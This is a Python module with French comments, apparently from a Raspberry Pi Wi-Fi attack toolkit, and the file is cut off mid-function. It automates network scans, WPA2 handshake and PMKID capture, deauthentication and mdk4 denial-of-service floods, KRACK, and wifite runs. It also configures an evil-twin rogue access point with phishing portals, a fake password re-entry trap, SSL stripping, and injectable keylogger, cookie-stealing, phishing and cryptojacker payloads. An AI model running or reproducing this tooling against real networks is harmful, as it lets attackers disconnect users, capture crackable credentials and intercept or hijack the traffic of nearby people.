"""
Module WiFi — adaptateur AWUS036ACH (chipset RTL8812AU).

Actions branchées :
  - scan             : énumère les APs (passive, 15s, channel-hopping).
  - clients          : énumère les stations + probes (passive, 15s).
  - handshake        : capture passive du 4-way handshake d'un AP ciblé.
                       Sans deauth → dépend d'une (re)connexion naturelle.
  - handshake_deauth : capture + injection deauth (lab mode requis).
                       Cible "Tous (broadcast)" ou un client précis.
  - pmkid            : récupération PMKID via hcxdumptool 7.x (BPF filter).
  - deauth           : salve deauth ciblée (lab mode requis).
  - dos              : DoS WiFi via mdk4 : beacon/auth/deauth/michael.

Notes d'implémentation :
  - `_run` utilise errors="replace" pour ne pas casser sur du binaire UTF-8.
  - `_run_quiet` redirige stdout/stderr → DEVNULL (airodump-ng crache du
    curses binaire, l'avaler en text=True faisait planter clients en
    UnicodeDecodeError).
  - PMKID utilise la syntaxe hcxdumptool 7.0 : BPF compilé via --bpfc puis
    --bpf=<file>. L'ancienne --filterlist_ap/--filtermode est supprimée.
  - `_deauth` lock le canal via `iw set channel` avant aireplay-ng (sinon
    "No such BSSID available" si la radio est restée sur le mauvais canal).
  - `run()` est englobé dans un try/except global qui capture les
    exceptions et les renvoie en {ok:false, error} + log stderr → journalctl.
"""
import os
import re
import select as _sel
import shutil
import signal
import subprocess
import sys
import time
import traceback
from html import escape
from pathlib import Path
from typing import Any, Dict, List, Optional

from core.base_module import BaseModule, Action
from core import memory
from core.tasks import current_task
import payloads as _payloads


SCAN_DIR = Path("/tmp/nexuspi")
SCAN_PREFIX = SCAN_DIR / "scan"
HS_PREFIX = SCAN_DIR / "hs"
PMKID_PCAP = SCAN_DIR / "pmkid.pcapng"
PMKID_22000 = SCAN_DIR / "pmkid.22000"
BPF_FILTER = SCAN_DIR / "filter.bpf"

# Evil Twin paths & subnet
ET_DIR = SCAN_DIR / "eviltwin"
ET_HOSTAPD_CONF = ET_DIR / "hostapd.conf"
ET_DNSMASQ_CONF = ET_DIR / "dnsmasq.conf"
ET_DNSMASQ_LEASES = ET_DIR / "dnsmasq.leases"
ET_PORTAL_LOG = ET_DIR / "creds.log"
ET_PROJECT_DIR = Path(__file__).resolve().parent.parent  # nexuspi/
ET_PORTAL_SCRIPT = ET_PROJECT_DIR / "captive_portal.py"
ET_INJECT_SCRIPT = ET_PROJECT_DIR / "mitm_inject.py"
ET_INJECT_PORT = 8080
ET_MITMPROXY_ADDON = ET_PROJECT_DIR / "mitmproxy_inject.py"
ET_MITMPROXY_PORT = 8080
ET_MITMPROXY_HOME = Path.home() / ".mitmproxy"

# KRACK
KRACK_SCRIPT = ET_PROJECT_DIR / "krack_attack.py"
KRACK_DIR = SCAN_DIR / "krack"
KRACK_PCAP = KRACK_DIR / "krack-capture.pcap"

VALID_TEMPLATES = ("wifi-auth", "wifi-resaisir",
                   "cafe", "hotel", "gare", "airport", "mall", "wifi-app",
                   "custom")


class _StopRequested(Exception):
    """Levée en interne pour court-circuiter vers le cleanup en finally."""
    pass

# Interface upstream pour le NAT en mode MITM (eth0 = lien SSH/ICS)
ET_UPSTREAM_IFACE = "eth0"

# Sous-réseau du rogue AP — choisi pour ne pas chevaucher 192.168.137.x (ICS)
ET_IP = "192.168.99.1"
ET_PREFIX = "24"
ET_DHCP_FROM = "192.168.99.10"
ET_DHCP_TO = "192.168.99.100"

DEFAULT_SCAN_DURATION = 15
DEFAULT_CAPTURE_DURATION = 60
DEFAULT_DEAUTH_COUNT = 10
DEFAULT_EVILTWIN_DURATION = 120


# ── Helpers subprocess ──────────────────────────────────────────────────────

def _run(cmd: List[str], timeout: int = 30) -> subprocess.CompletedProcess:
    """
    Capture stdout/stderr en texte. errors='replace' évite UnicodeDecodeError
    si l'outil crache du binaire (curses, hex dumps…) — un seul byte invalide
    suffisait à planter tout l'endpoint.
    """
    return subprocess.run(cmd, capture_output=True, text=True,
                          errors="replace", timeout=timeout)


def _run_quiet(cmd: List[str], timeout: int) -> subprocess.CompletedProcess:
    """
    Variante sans capture : stdout/stderr → DEVNULL. À utiliser pour
    airodump-ng / hcxdumptool / aireplay-ng dont on n'a pas besoin du output.
    """
    return subprocess.run(cmd, stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL, timeout=timeout)


def _which(name: str) -> bool:
    return shutil.which(name) is not None


def _clean_scan_dir() -> None:
    subprocess.run(["sudo", "-n", "rm", "-rf", str(SCAN_DIR)],
                   capture_output=True, timeout=5)
    SCAN_DIR.mkdir(parents=True, exist_ok=True)


# ── Sessions monitor ────────────────────────────────────────────────────────

def _enter_monitor(iface: str) -> str:
    _run(["sudo", "-n", "airmon-ng", "check", "kill"], timeout=15)
    _run(["sudo", "-n", "airmon-ng", "start", iface], timeout=15)
    if Path(f"/sys/class/net/{iface}mon").exists():
        return f"{iface}mon"
    return iface


def _exit_monitor(mon_iface: str) -> None:
    try:
        _run(["sudo", "-n", "airmon-ng", "stop", mon_iface], timeout=15)
    except Exception:
        pass


def _set_channel(mon_iface: str, channel: int) -> None:
    """Lock le canal avant injection (sinon aireplay tape dans le vide)."""
    _run(["sudo", "-n", "iw", "dev", mon_iface, "set", "channel",
          str(channel)], timeout=5)


def _run_airodump_session(
    iface: str,
    duration: int,
    output_prefix: Path = SCAN_PREFIX,
    output_format: str = "csv",
    bssid: Optional[str] = None,
    channel: Optional[int] = None,
) -> Optional[Path]:
    """Workflow airodump synchrone (monitor → capture → restore)."""
    _clean_scan_dir()
    mon_iface = _enter_monitor(iface)
    try:
        cmd = ["sudo", "-n", "timeout", "--signal=INT", str(duration),
               "airodump-ng",
               "-w", str(output_prefix),
               "--output-format", output_format,
               "--write-interval", "1"]
        if bssid:
            cmd += ["--bssid", bssid]
        if channel:
            cmd += ["-c", str(channel)]
        cmd.append(mon_iface)
        # ★ _run_quiet : airodump crache du binaire en stdout, on l'avale
        _run_quiet(cmd, timeout=duration + 10)

        ext = "csv" if output_format == "csv" else "cap"
        files = sorted(output_prefix.parent.glob(f"{output_prefix.name}-*.{ext}"))
        return files[-1] if files else None
    finally:
        _exit_monitor(mon_iface)


def _capture_with_deauth(
    iface: str, bssid: str, channel: int,
    duration: int, deauth_count: int, client_mac: str = "",
) -> Dict[str, Any]:
    """airodump-ng (Popen) + aireplay-ng -0 (sync) en parallèle."""
    _clean_scan_dir()
    mon_iface = _enter_monitor(iface)
    airodump_proc: Optional[subprocess.Popen] = None
    deauth_out = ""
    try:
        airodump_proc = subprocess.Popen(
            ["sudo", "-n", "airodump-ng",
             "-w", str(HS_PREFIX),
             "--output-format", "pcap",
             "--write-interval", "1",
             "-c", str(channel),
             "--bssid", bssid,
             mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(3)  # laisse airodump se caler

        deauth_cmd = ["sudo", "-n", "aireplay-ng",
                      "-0", str(deauth_count), "-a", bssid]
        if client_mac:
            deauth_cmd += ["-c", client_mac]
        deauth_cmd.append(mon_iface)
        try:
            res = _run(deauth_cmd, timeout=max(30, deauth_count * 3))
            deauth_out = (res.stdout or "") + (res.stderr or "")
        except subprocess.TimeoutExpired:
            deauth_out = "[aireplay-ng timeout]"

        elapsed = 3 + min(deauth_count * 1, 30)
        time.sleep(max(2, duration - elapsed))
    finally:
        if airodump_proc:
            try:
                airodump_proc.send_signal(signal.SIGINT)
                airodump_proc.wait(timeout=10)
            except (subprocess.TimeoutExpired, ProcessLookupError):
                airodump_proc.kill()
            except Exception:
                pass
        subprocess.run(["sudo", "-n", "pkill", "-INT", "airodump-ng"],
                       capture_output=True, timeout=5)
        _exit_monitor(mon_iface)

    cap_files = sorted(SCAN_DIR.glob("hs-*.cap"))
    return {"cap": cap_files[-1] if cap_files else None, "deauth": deauth_out}


# ── PMKID (hcxdumptool 7.0+) ────────────────────────────────────────────────

def _run_hcxdumptool_pmkid(iface: str, bssid: str, channel: int,
                           duration: int) -> Optional[Path]:
    """
    hcxdumptool 7.x : --filterlist_ap a disparu. Nouvelle voie = filtre BPF
    compilé via --bpfc, puis injecté via --bpf=<file>.

      1. airmon-ng check kill (libère wlan1) — PAS de airmon-ng start :
         hcxdumptool gère le monitor mode lui-même (et râle si on l'a fait).
      2. hcxdumptool --bpfc="wlan addr1/2/3 <BSSID>"  → écrit filter.bpf
      3. hcxdumptool -i wlan1 -c <CH>a -w pcapng --bpf=filter.bpf
      4. Restore managed mode (sinon wlan1 reste en monitor au sortir).
    """
    _clean_scan_dir()
    _run(["sudo", "-n", "airmon-ng", "check", "kill"], timeout=15)

    try:
        bssid_hex = bssid.replace(":", "").lower()
        bpf_expr = (f"wlan addr1 {bssid_hex} or "
                    f"wlan addr2 {bssid_hex} or "
                    f"wlan addr3 {bssid_hex}")
        bpf_res = _run(["hcxdumptool", f"--bpfc={bpf_expr}"], timeout=10)
        BPF_FILTER.write_text(bpf_res.stdout or "", encoding="ascii")
        if not BPF_FILTER.read_text().strip():
            return None  # compile BPF KO

        # Canal : 2.4 GHz = "a", 5 GHz = "b"
        ch_str = f"{channel}{'a' if channel <= 14 else 'b'}"

        _run_quiet(
            ["sudo", "-n", "timeout", "--signal=INT", str(duration),
             "hcxdumptool",
             "-i", iface,
             "-c", ch_str,
             "-w", str(PMKID_PCAP),
             f"--bpf={BPF_FILTER}"],
            timeout=duration + 10,
        )
        return PMKID_PCAP if PMKID_PCAP.exists() and PMKID_PCAP.stat().st_size > 0 else None
    finally:
        # hcxdumptool laisse l'iface en monitor → on remet en managed
        _run(["sudo", "-n", "iw", "dev", iface, "set", "type", "managed"],
             timeout=5)
        _run(["sudo", "-n", "ip", "link", "set", iface, "up"], timeout=5)


# ── Parsing CSV airodump-ng ─────────────────────────────────────────────────

_MAC_RE = re.compile(r"^[0-9A-Fa-f:]{17}$")


def _to_int(v: str, default: int = 0) -> int:
    try:
        return int(v)
    except (ValueError, TypeError):
        return default


def _parse_aps(path: Path) -> List[Dict[str, Any]]:
    aps: List[Dict[str, Any]] = []
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return aps
    in_section = False
    for raw in text.split("\n"):
        line = raw.rstrip("\r")
        s = line.strip()
        if not s:
            if in_section:
                break
            continue
        if s.startswith("BSSID,"):
            in_section = True
            continue
        if s.startswith("Station MAC,"):
            break
        if not in_section:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not _MAC_RE.match(bssid):
            continue
        essid = parts[13] if len(parts) > 13 else ""
        aps.append({
            "bssid": bssid,
            "essid": essid or "<hidden>",
            "channel": _to_int(parts[3]),
            "encryption": parts[5] or "OPN",
            "cipher": parts[6],
            "auth": parts[7],
            "power": _to_int(parts[8]),
            "beacons": _to_int(parts[9]),
        })
    aps.sort(key=lambda a: a["power"], reverse=True)
    return aps


def _parse_stations(path: Path,
                    aps_by_bssid: Optional[Dict[str, Dict[str, Any]]] = None
                    ) -> List[Dict[str, Any]]:
    stations: List[Dict[str, Any]] = []
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return stations
    in_section = False
    for raw in text.split("\n"):
        line = raw.rstrip("\r")
        s = line.strip()
        if not s:
            continue
        if s.startswith("Station MAC,"):
            in_section = True
            continue
        if not in_section:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 6:
            continue
        mac = parts[0]
        if not _MAC_RE.match(mac):
            continue
        bssid = parts[5]
        associated = bssid != "(not associated)" and _MAC_RE.match(bssid) is not None
        ap_essid = None
        if associated and aps_by_bssid:
            ap_essid = aps_by_bssid.get(bssid, {}).get("essid")
        probes = [p for p in parts[6:] if p]
        stations.append({
            "mac": mac,
            "power": _to_int(parts[3]),
            "packets": _to_int(parts[4]),
            "bssid": bssid if associated else None,
            "ap_essid": ap_essid,
            "probes": probes,
        })
    stations.sort(key=lambda s: s["power"], reverse=True)
    return stations


# ── Détection handshake / PMKID ─────────────────────────────────────────────

def _has_handshake(cap_path: Optional[Path]) -> Dict[str, Any]:
    if not cap_path or not cap_path.exists() or cap_path.stat().st_size < 100:
        return {"found": False, "count": 0}
    try:
        res = _run(["aircrack-ng", str(cap_path)], timeout=20)
        out = (res.stdout or "") + (res.stderr or "")
    except Exception:
        return {"found": False, "count": 0}
    m = re.search(r"(\d+)\s+handshake", out, re.IGNORECASE)
    n = int(m.group(1)) if m else 0
    return {"found": n > 0, "count": n}


def _extract_pmkid(pcap_path: Optional[Path]) -> Dict[str, Any]:
    if not pcap_path or not pcap_path.exists() or pcap_path.stat().st_size < 100:
        return {"found": False}
    if not _which("hcxpcapngtool"):
        return {"found": False, "error": "hcxpcapngtool absent."}
    try:
        _run(["sudo", "-n", "hcxpcapngtool",
              "-o", str(PMKID_22000), str(pcap_path)], timeout=20)
    except Exception as e:
        return {"found": False, "error": f"hcxpcapngtool: {e}"}
    if PMKID_22000.exists() and PMKID_22000.stat().st_size > 0:
        first = PMKID_22000.read_text(errors="replace").splitlines()[0:1]
        return {"found": True, "file": str(PMKID_22000),
                "sample": first[0] if first else ""}
    return {"found": False}


# ── Formatage console (pas de ✓ en tête — la JS l'ajoute) ───────────────────

def _format_aps_console(aps: List[Dict[str, Any]]) -> str:
    if not aps:
        return "Aucun AP détecté pendant la fenêtre de scan."
    header = f"{len(aps)} AP(s) détecté(s) :\n"
    header += "  PWR  CH  ENC      BSSID              SSID\n"
    header += "  ───  ──  ───      ─────────────────  ────\n"
    rows = []
    for a in aps:
        essid = escape(str(a["essid"]))[:32]
        bssid = escape(a["bssid"])
        enc = escape(a["encryption"] or "OPN")[:7]
        rows.append(f"  {a['power']:>3} {a['channel']:>3}  {enc:<7}  "
                    f"{bssid}  <b>{essid}</b>")
    return header + "\n".join(rows)


def _format_stations_console(stations: List[Dict[str, Any]]) -> str:
    if not stations:
        return ("Aucune station détectée pendant la fenêtre de scan.\n"
                "Astuce : augmente la durée ou rapproche-toi des appareils.")
    header = f"{len(stations)} station(s) détectée(s) :\n"
    header += "  PWR PKT  MAC                ASSOCIÉ À          PROBES\n"
    header += "  ─── ───  ─────────────────  ─────────────────  ──────\n"
    rows = []
    for st in stations:
        mac = escape(st["mac"])
        if st["bssid"]:
            ap_label = st["ap_essid"] or st["bssid"]
            associated = escape(str(ap_label))[:17]
        else:
            associated = "(libre)"
        probes_list = st["probes"][:4]
        probes_str = ", ".join(escape(p) for p in probes_list)
        if len(st["probes"]) > 4:
            probes_str += f" +{len(st['probes'])-4}"
        if not probes_str:
            probes_str = "—"
        rows.append(f"  {st['power']:>3} {st['packets']:>3}  {mac}  "
                    f"{associated:<17}  <b>{probes_str}</b>")
    return header + "\n".join(rows)


# ── Module ──────────────────────────────────────────────────────────────────

class WifiModule(BaseModule):
    id = "wifi"
    name = "WiFi — AWUS036ACH"
    icon = "wifi"
    description = "RTL8812AU — recon, capture de handshake, attaques actives."

    IFACE_CANDIDATES = ("wlan1", "wlan2", "wlan3")

    def __init__(self):
        self._last_aps: List[Dict[str, Any]] = []
        self._last_stations: List[Dict[str, Any]] = []

    def _iface(self) -> Optional[str]:
        try:
            nets = os.listdir("/sys/class/net")
        except FileNotFoundError:
            return None
        for cand in self.IFACE_CANDIDATES:
            if cand in nets:
                return cand
        return None

    def detect(self) -> bool:
        return self._iface() is not None

    def state(self) -> Dict[str, Any]:
        return {
            "last_aps": [{
                "bssid": a["bssid"], "essid": a["essid"],
                "channel": a["channel"], "encryption": a["encryption"],
                "power": a["power"],
            } for a in self._last_aps],
            "last_stations": [{
                "mac": s["mac"], "bssid": s["bssid"],
                "ap_essid": s["ap_essid"], "power": s["power"],
            } for s in self._last_stations],
        }

    def actions(self) -> List[Action]:
        target_ap = {"name": "bssid", "label": "Cible (AP)", "type": "target_ap"}
        target_sta = {"name": "client", "label": "Client",
                      "type": "target_station"}
        dur_capture = {"name": "duration", "label": "Durée (s)", "type": "int",
                       "default": DEFAULT_CAPTURE_DURATION,
                       "min": 10, "max": 300}
        deauth_count = {"name": "count", "label": "Trames deauth", "type": "int",
                        "default": DEFAULT_DEAUTH_COUNT, "min": 1, "max": 100}
        dur_scan = {"name": "duration", "label": "Durée scan (s)",
                    "type": "int", "default": DEFAULT_SCAN_DURATION,
                    "min": 5, "max": 60}
        return [
            Action("scan", "Scan réseaux", "passive",
                   description="Énumère les APs : SSID, BSSID, canal, chiffrement, RSSI (airodump-ng).",
                   params=[dur_scan]),
            Action("clients", "Clients & probe requests", "passive",
                   description="Stations à portée + SSIDs qu'elles cherchent. "
                               "Cible vide = tous réseaux. Cible = airodump filtré sur ce BSSID "
                               "= clients de CE réseau uniquement.",
                   params=[dur_scan,
                           {"name": "bssid", "label": "Cible (optionnel)",
                            "type": "target_ap_optional"}]),
            Action("wifite", "Wifite — auto-attaque (PMKID/WPS/Handshake)", "active",
                   description="Lance l'outil `wifite` sur 1 cible : essaye PMKID + WPS + "
                               "handshake automatiquement, selon ce que supporte l'AP. "
                               "Streame l'output live, captures → Mémoire. Lab mode requis.",
                   params=[target_ap,
                           {"name": "duration", "label": "Timeout total (s)",
                            "type": "int", "default": 180, "min": 60, "max": 600}]),
            Action("handshake", "Handshake WPA2 — passif", "capture",
                   description="Attend une (re)connexion. Coupe/rallume le WiFi d'un appareil pour déclencher.",
                   params=[target_ap, dur_capture]),
            Action("handshake_deauth", "Handshake WPA2 — deauth", "active",
                   description="Force la reco d'un client par deauth. \"Tous\" = broadcast. Lab mode requis.",
                   params=[target_ap, target_sta, deauth_count, dur_capture]),
            Action("pmkid", "Capture PMKID", "capture",
                   description="hcxdumptool 7.x ciblé. Beaucoup d'APs récents ont PMKID désactivé.",
                   params=[target_ap, dur_capture]),
            Action("deauth", "Déauthentification", "active",
                   description="Salve de trames deauth 802.11 (aireplay-ng). "
                               "Déconnecte un ou tous les clients d'un AP. Lab mode requis.",
                   params=[target_ap, target_sta, deauth_count]),
            Action("dos", "DoS WiFi (mdk4)", "active",
                   description="Flood massif via mdk4. Beacon flood = pollution SSID, "
                               "Auth flood = crash AP, Michael = attaque TKIP. Lab mode requis.",
                   params=[
                       target_ap,
                       {"name": "attack", "label": "Type d'attaque",
                        "type": "select",
                        "options": [
                            {"value": "beacon", "label": "Beacon flood — faux SSIDs"},
                            {"value": "auth",   "label": "Auth flood — surcharge AP"},
                            {"value": "deauth", "label": "Deauth amass — kick massif"},
                            {"value": "michael","label": "Michael (TKIP) — crash AP"},
                        ], "default": "beacon"},
                       {"name": "duration", "label": "Durée (s)", "type": "int",
                        "default": 30, "min": 5, "max": 120},
                   ]),
            Action("krack", "KRACK — réinstall. clé WPA2", "active",
                   description="Test CVE-2017-13077. Clone l'AP (même SSID + mdp) sur "
                               "un autre canal, rejoue le Message 3 du handshake. Nécessite "
                               "le mot de passe du réseau cible. Lab mode requis.",
                   params=[target_ap,
                           {"name": "wpa_passphrase", "label": "Mot de passe WPA2",
                            "type": "text", "default": "",
                            "placeholder": "mot de passe du réseau cible"},
                           {"name": "duration", "label": "Durée (s)", "type": "int",
                            "default": 120, "min": 30, "max": 600}]),
            Action("eviltwin", "Evil Twin + portail / MITM", "rogue",
                   description="Rogue AP customisable. Mode `captive` = portail HTTP qui capture les soumissions. "
                               "Mode `mitm` = NAT vers eth0 + sniff tcpdump (le client a vraiment Internet, "
                               "tu vois ses requêtes en pcap). Lab mode requis.",
                   params=[
                       target_ap,
                       {"name": "custom_ssid", "label": "SSID (vide=cloner)",
                        "type": "text", "default": "",
                        "placeholder": "ex: Free WiFi"},
                       {"name": "mode", "label": "Mode",
                        "type": "select",
                        "options": [
                            {"value": "captive_nat", "label": "⭐ Portail + Internet (popup auto)"},
                            {"value": "captive",     "label": "Portail seul (pas d'internet)"},
                            {"value": "mitm",        "label": "MITM HTTP — sniff + JS inject"},
                            {"value": "mitm_https",  "label": "MITM HTTPS — cert root requis"},
                        ], "default": "captive_nat"},
                       {"name": "template", "label": "Template portail",
                        "type": "select",
                        "options": [
                            {"value": "wifi-auth",     "label": "Auth WiFi générique"},
                            {"value": "wifi-resaisir", "label": "Ressaisir mdp WiFi (piège)"},
                            {"value": "cafe",          "label": "Café ☕"},
                            {"value": "hotel",         "label": "Hôtel 🏨"},
                            {"value": "gare",          "label": "Gare 🚄"},
                            {"value": "airport",       "label": "Aéroport ✈️"},
                            {"value": "mall",          "label": "Centre commercial 🛍️"},
                            {"value": "wifi-app",      "label": "📲 App WiFi requise (push APK)"},
                            {"value": "custom",        "label": "✏️ HTML personnalisé"},
                        ], "default": "wifi-auth"},
                       {"name": "custom_portal_html",
                        "label": "HTML du portail (template = custom)",
                        "type": "textarea", "default": "",
                        "placeholder": "<html>...</html>  —  {SSID} et {NAME} seront remplacés"},
                       {"name": "portal_name",
                        "label": "Nom du lieu (templates café/hôtel/etc.)",
                        "type": "text", "default": "",
                        "placeholder": "ex: Café de la Gare, Hôtel Mercure"},
                       {"name": "auth_mode", "label": "Sécurité AP",
                        "type": "select",
                        "options": [
                            {"value": "open", "label": "Ouvert"},
                            {"value": "wpa2", "label": "WPA2-PSK (mdp requis)"},
                        ], "default": "open"},
                       {"name": "wpa2_password",
                        "label": "Mdp WPA2 (8-63 car.)",
                        "type": "text", "default": "",
                        "placeholder": "min 8 caractères"},
                       {"name": "strip_https",
                        "label": "SSL strip (HTTPS→HTTP)",
                        "type": "select",
                        "options": [
                            {"value": "no",  "label": "Non"},
                            {"value": "yes", "label": "Oui (HSTS résistent)"},
                        ], "default": "no"},
                       {"name": "payload_preset",
                        "label": "Payloads (combinables)",
                        "type": "checkboxes",
                        "options": [
                            {"value": "keylogger",         "label": "Keylogger"},
                            {"value": "form_hijack",       "label": "Intercept forms"},
                            {"value": "cookie_stealer",    "label": "Vol cookies"},
                            {"value": "google_phishing",   "label": "Phishing Google"},
                            {"value": "facebook_phishing", "label": "Phishing Facebook"},
                            {"value": "fake_update",       "label": "Fausse MAJ"},
                            {"value": "page_hijack",       "label": "Hijack page"},
                            {"value": "cryptojacker",      "label": "Cryptojacker"},
                            {"value": "alert",             "label": "Alert PoC"},
                        ]},
                       {"name": "inject_script",
                        "label": "Injection JS custom (en plus des payloads)",
                        "type": "textarea", "default": "",
                        "placeholder": "ex: alert('NexusPi')"},
                       {"name": "deauth_pre_seconds",
                        "label": "Pré-deauth burst (s)",
                        "type": "int", "default": 0, "min": 0, "max": 60},
                       {"name": "deauth_continuous",
                        "label": "Deauth continu (wlan0)",
                        "type": "select",
                        "options": [
                            {"value": "no",  "label": "Non"},
                            {"value": "yes", "label": "Oui (wlan0 nexmon)"},
                        ], "default": "no"},
                       {"name": "deauth_target_client",
                        "label": "Cible deauth continu",
                        "type": "target_station"},
                       {"name": "duration", "label": "Durée rogue (s)", "type": "int",
                        "default": DEFAULT_EVILTWIN_DURATION,
                        "min": 30, "max": 600},
                   ]),
        ]

    # ── Implémentations actions ─────────────────────────────────────────────

    def _preflight(self) -> Optional[Dict[str, Any]]:
        if self._iface() is None:
            return {"ok": False, "error": "wlan1 absent (driver 88XXau chargé ?)"}
        if not (_which("airodump-ng") and _which("airmon-ng")):
            return {"ok": False, "error": "aircrack-ng absent."}
        return None

    def _resolve_target(self, bssid: str) -> Optional[Dict[str, Any]]:
        if not bssid:
            return None
        for a in self._last_aps:
            if a["bssid"].lower() == bssid.lower():
                return a
        return None

    def _scan(self, duration: int) -> Dict[str, Any]:
        err = self._preflight()
        if err:
            return err
        iface = self._iface()
        csv_path = _run_airodump_session(iface, duration)
        if csv_path is None:
            return {"ok": False, "error": "Aucun CSV produit."}
        aps = _parse_aps(csv_path)
        self._last_aps = aps
        return {
            "ok": True, "iface": iface, "duration": duration,
            "count": len(aps), "aps": aps,
            "message": _format_aps_console(aps),
        }

    def _clients(self, duration: int, target_bssid: str = "") -> Dict[str, Any]:
        err = self._preflight()
        if err:
            return err
        iface = self._iface()
        task = current_task()
        # Si BSSID fourni → filtre airodump sur ce réseau (résolution canal)
        bssid_arg = None
        channel_arg = None
        if target_bssid:
            target = self._resolve_target(target_bssid)
            if target:
                bssid_arg = target["bssid"]
                channel_arg = target["channel"]
                if task: task.log(f"Filtrage sur {target['essid']} "
                                  f"({target['bssid']}, ch{target['channel']})")
            else:
                if task: task.log(f"BSSID {target_bssid} introuvable → "
                                  "scan large (tous réseaux)", "warn")
        csv_path = _run_airodump_session(iface, duration,
                                         bssid=bssid_arg, channel=channel_arg)
        if csv_path is None:
            # Retry une fois : reset propre + tentative
            if task: task.log("CSV vide, retry après cleanup forcé…", "warn")
            subprocess.run(["sudo", "-n", "pkill", "-9", "airodump-ng"],
                           capture_output=True, timeout=5)
            time.sleep(2)
            csv_path = _run_airodump_session(iface, duration,
                                             bssid=bssid_arg,
                                             channel=channel_arg)
            if csv_path is None:
                return {"ok": False,
                        "error": "Aucun CSV produit (airodump KO 2×). "
                                 "Vérifie wlan1 : `iw dev wlan1 info`."}
        aps = _parse_aps(csv_path)
        self._last_aps = aps
        aps_by_bssid = {a["bssid"]: a for a in aps}
        stations = _parse_stations(csv_path, aps_by_bssid)
        self._last_stations = stations
        return {
            "ok": True, "iface": iface, "duration": duration,
            "count": len(stations), "stations": stations,
            "message": _format_stations_console(stations),
        }

    def _wifite_attack(self, bssid: str, duration: int) -> Dict[str, Any]:
        """
        Wrapper autour de l'outil `wifite` (Kali default). Lance wifite ciblé
        sur 1 BSSID — wifite essaye tout seul PMKID/WPS/Handshake selon ce
        qu'il détecte. On streame son output ligne par ligne dans la console.
        """
        err = self._preflight()
        if err:
            return err
        if not _which("wifite"):
            return {"ok": False,
                    "error": "wifite absent (sudo apt install -y wifite)."}
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}

        task = current_task()
        iface = self._iface()

        # Wifite dump dans son cwd → on isole dans /tmp/nexuspi/wifite/
        wifite_dir = SCAN_DIR / "wifite"
        _clean_scan_dir()
        wifite_dir.mkdir(parents=True, exist_ok=True)

        if task:
            task.log(f"=== Wifite ciblé sur {target['essid']} "
                     f"({target['bssid']}) ===")

        cmd = [
            "sudo", "-n", "wifite",
            "-i", iface,
            "-b", target["bssid"],
            "--kill",          # tue les processus qui squattent wlan1
            "--clear-color",   # pas de codes ANSI dans l'output
            "--skip-crack",    # capture seulement (cassage = côté PC + hashcat)
        ]

        proc = subprocess.Popen(
            cmd,
            cwd=str(wifite_dir),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=1,
            text=True,
            errors="replace",
        )

        import threading
        stop_thread = threading.Event()

        def reader():
            try:
                for line in proc.stdout:
                    if stop_thread.is_set():
                        break
                    line = line.rstrip()
                    if line and task:
                        # wifite imprime des banners ASCII — on les skip
                        if line.startswith(("===", "---", "   ")):
                            continue
                        task.log(line)
            except Exception:
                pass

        rdr = threading.Thread(target=reader, daemon=True)
        rdr.start()

        # Attente avec stop interruptible
        try:
            elapsed = 0
            while elapsed < duration:
                if task and task.is_stopped():
                    if task: task.log("Stop demandé — kill wifite", "warn")
                    proc.terminate()
                    break
                if proc.poll() is not None:
                    if task: task.log("Wifite a terminé tout seul", "info")
                    break
                time.sleep(1)
                elapsed += 1
            if proc.poll() is None:
                if task: task.log(f"Timeout {duration}s atteint — kill wifite",
                                  "warn")
                proc.terminate()
        finally:
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()
                subprocess.run(["sudo", "-n", "pkill", "-9", "wifite"],
                               capture_output=True, timeout=5)
                subprocess.run(["sudo", "-n", "pkill", "-9", "airodump-ng"],
                               capture_output=True, timeout=5)
            stop_thread.set()
            rdr.join(timeout=5)

        # Collecter les fichiers produits par wifite + archiver en Mémoire
        # Wifite v2 stocke dans subfolder hs/ (handshakes) et root (PMKID hash)
        caps_found = sorted(wifite_dir.glob("**/*.cap"))
        pmkids_found = sorted(wifite_dir.glob("**/*.22000"))

        stored_caps: List[str] = []
        for cap in caps_found:
            dest = memory.store_handshake(
                bssid=target["bssid"], essid=target["essid"],
                channel=target["channel"],
                encryption=target.get("encryption", ""),
                cap_path=cap,
            )
            if dest:
                stored_caps.append(str(dest))

        stored_pmkids: List[str] = []
        for pk in pmkids_found:
            dest = memory.store_pmkid(
                bssid=target["bssid"], essid=target["essid"],
                channel=target["channel"],
                encryption=target.get("encryption", ""),
                hash_path=pk,
            )
            if dest and dest.get("22000"):
                stored_pmkids.append(str(dest["22000"]))

        if stored_caps or stored_pmkids:
            msg = (f"✅ Wifite a capturé sur <b>{escape(target['essid'])}</b> :\n"
                   f"  • {len(stored_caps)} handshake(s) (.cap)\n"
                   f"  • {len(stored_pmkids)} PMKID(s) (.22000)\n"
                   f"Voir la carte <b>Mémoire</b> pour télécharger et cracker "
                   f"avec hashcat côté PC.")
        else:
            msg = (f"Wifite terminé sur <b>{escape(target['essid'])}</b> sans "
                   "capture exploitable.\n"
                   "Causes probables : AP trop loin, aucun client à dérouter, "
                   "PMKID désactivé côté AP, WPS patché.\n"
                   "Tente : (1) rapproche le Pi de la cible, "
                   "(2) augmente le timeout, "
                   "(3) lance `Clients & probes` ciblé pour vérifier qu'il "
                   "y a bien des stations connectées à dérouter.")

        return {
            "ok": True, "target": target,
            "captured_handshakes": stored_caps,
            "captured_pmkids": stored_pmkids,
            "message": msg,
        }

    def _auto_attack(self, bssid: str, duration: int) -> Dict[str, Any]:
        """
        Pipeline wifite-style : tente plusieurs attaques dans l'ordre sur 1 cible
        et s'arrête à la 1re réussite.

        Ordre :
          1. PMKID via hcxdumptool (rapide, ne nécessite aucun client connecté)
          2. Si KO → handshake_deauth en broadcast (force reco des clients)

        Retourne le 1er succès ou un récap des échecs.
        """
        err = self._preflight()
        if err:
            return err
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}
        task = current_task()
        def _l(m, lvl="info"):
